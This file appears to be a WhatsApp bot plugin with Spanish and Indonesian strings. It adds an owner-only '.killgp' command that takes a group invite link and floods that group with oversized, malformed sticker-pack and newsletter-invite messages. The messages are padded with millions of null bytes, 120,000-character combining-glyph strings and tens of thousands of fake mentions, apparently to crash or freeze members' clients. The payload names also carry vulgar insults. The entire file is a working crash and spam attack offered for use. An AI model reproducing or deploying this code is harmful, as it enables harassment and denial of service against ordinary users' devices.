import { sleep } from '../lib/utils.js'; // Usa tu función de sleep o setTimeout wrapped en Promise

let handler = async (m, { args, conn }) => {
  if (!args[0]) return m.reply('🚫 Ingresa el link del grupo.\nEjemplo: .killgp +https://chat.whatsapp.com/xxxxx');

  const groupLink = args[0].replace('+', '');
  const code = groupLink.split('/')[1];

  if (!code) return m.reply('❌ Link de grupo no válido.');

  let target;
  try {
    target = await conn.groupGetInviteInfo(code);
    target = target.id;
  } catch (e) {
    return m.reply('⚠️ No pude obtener información del grupo.');
  }

  async function killgc(target) {
    let massage = [];
    for (let r = 0; r < 1000; r++) {
      massage.push({
        fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
        isAnimated: true,
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      });
    }
    const msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\0".repeat(1000000),
            version: 3
          },
          stickerPackMessage: {
            stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
            name: "WOI GRUP KONTOL",
            publisher: "",
            stickers: massage,
            fileLength: "999999999999999",
            fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
            fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
            mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
            directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc",
            mediaKeyTimestamp: "99999999",
            trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
            thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
            thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
            thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
            thumbnailHeight: 99999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
            stickerPackSize: 9999999999999,
            stickerPackOrigin: 9999999999999,
            contextInfo: {
              mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              isSampled: true,
              participant: target,
              remoteJid: target,
              forwardingScore: 9741,
              isForwarded: true,
              businessMessageForwardInfo: { businessOwnerJid: target },
              externalAdReply: {
                title: "ZALLISKING",
                body: "Grup Kontol"
              }
            }
          }
        }
      }
    };
    await conn.relayMessage(target, msg, {});
  }

  async function rusuhgc(target) {
    const msg = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "Mode Rusuh😹" + "ꦾ".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          { name: "call_permission_request", buttonParamsJson: "{}" },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_0_TextInput_0: "\0".repeat(500000),
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            }
          }
        ]
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Vampire" }]
      }
    };
    await conn.relayMessage(target, msg, { userJid: target });
  }

  async function gcampas(target) {
    const msg = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "ZALISKING" + "ꦾ".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
            inviteExpiration: Date.now() + 1814400000
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          { name: "call_permission_request", buttonParamsJson: "{}" },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_0_TextInput_0: "".repeat(50000),
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            }
          }
        ]
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Vampire Official" }]
      }
    };
    await conn.relayMessage(target, msg, { userJid: target });
  }

  async function blankgc(target) {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363370611316879@newsletter",
        newsletterName: "👑 • 𝐽𝒆𝓇𝓮𝓶𝒾𝒶𝒽 8𝐌 • 👑" + "XxX".repeat(9000),
        caption: "ؙ👑 • 𝐽𝒆𝓇𝓮𝓂𝒾𝒶𝒽 8𝐌 • 👑\n" + "XxX".repeat(9000),
        inviteExpiration: "0"
      }
    };
    await conn.relayMessage(target, msg, { userJid: target });
  }

  async function enviarSpam(cantidad) {
    for (let i = 0; i < cantidad; i++) {
      await killgc(target);
      await rusuhgc(target);
      await gcampas(target);
      await blankgc(target);
    }
  }

  await enviarSpam(20);
  await sleep(10000);
  await enviarSpam(20);
  await sleep(10000);
  await enviarSpam(10);

  m.reply('✅ Ataque finalizado');
};

handler.command = /^killgp$/i;
handler.owner = true;

export default handler;